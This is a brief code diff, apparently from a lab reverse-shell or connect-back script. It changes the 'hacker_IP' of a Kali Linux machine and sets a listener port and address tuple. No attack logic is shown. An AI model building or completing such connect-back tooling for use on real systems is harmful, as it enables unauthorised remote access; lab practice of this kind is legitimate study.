@@ -12,7 +12,7 @@ CHUNK_SIZE = 2048
 if __name__ == "__main__":
     
 
-    hacker_IP = "192.168.64.111" # kali linux IP
+    hacker_IP = "192.168.0.154" # kali linux IP
     hacker_port = 8008
     hacker_address = (hacker_IP, hacker_port)
     
